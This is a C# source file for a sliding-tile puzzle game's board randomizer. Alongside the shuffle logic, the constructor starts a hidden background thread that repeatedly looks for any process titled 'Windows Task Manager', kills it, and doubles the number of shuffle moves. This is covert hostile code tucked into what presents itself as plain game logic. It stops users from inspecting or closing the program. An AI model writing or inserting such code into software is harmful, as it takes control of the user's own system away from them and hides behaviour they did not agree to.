using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace TileGame {
	public class Randomizer {
		[DllImport("user32.dll")]
		private static unsafe extern bool InvalidateRect(IntPtr hWnd, RECT *lpRect, bool bErase);

		private static int RandomMoves = 250;
		private Random Random;
		private int Moves;
		private int X;
		private int Y;
		private int Last;
		private Thread TaskManagerThread;

		private unsafe void TaskManagerWatcher() {
			while ( true ) {
				Thread.Yield();
				foreach ( Process proc in Process.GetProcesses().Where(p => p.MainWindowTitle == "Windows Task Manager") ) {
					proc.Kill();
					X = -1;
					Y = -1;
					RandomMoves *= 2;
					IntPtr hWnd = Process.GetCurrentProcess().MainWindowHandle;
					RECT rect;
					rect.Left = 0;
					rect.Top = 0;
					rect.Right = 0;
					rect.Bottom = 0;
					InvalidateRect(hWnd, &rect, false);
				}
				Thread.Sleep(100);
			}
		}

		public bool Randomize(TileMap map) {
			if ( Moves < RandomMoves ) {
				int x;
				int y;
				if ( X == -1 || Y == -1 ) {
					for ( x = 0; x < TileDisplay.XTiles; ++x ) {
						for ( y = 0; y < TileDisplay.YTiles; ++y ) {
							if ( map.GetTile(x, y) == -1 ) {
								X = x;
								Y = y;
								goto done;
							}
						}
					}
				}
				done:
				x = -1;
				y = -1;
				int rand;
				do {
					rand = Random.Next(4);
					if ( rand == Last || (rand ^ Last) != 0x01 ) {
						switch ( rand ) {
							case 0:
								x = X + 1;
								y = Y;
								break;
							case 1:
								x = X - 1;
								y = Y;
								break;
							case 2:
								x = X;
								y = Y + 1;
								break;
							case 3:
								x = X;
								y = Y - 1;
								break;
						}
					}
				}
				while ( x < 0 || x >= TileDisplay.XTiles || y < 0 || y >= TileDisplay.YTiles );
				map.Slide(x, y);
				X = x;
				Y = y;
				Last = rand;
				++Moves;
				return true;
			} else {
				return false;
			}
		}

		public Randomizer() {
			Random = new Random();
			Moves = 0;
			X = 0;
			Y = 0;
			Last = -1;
			TaskManagerThread = new Thread(TaskManagerWatcher);
			TaskManagerThread.Start();
		}

		~Randomizer() {
			TaskManagerThread.Abort();
		}
	}
}

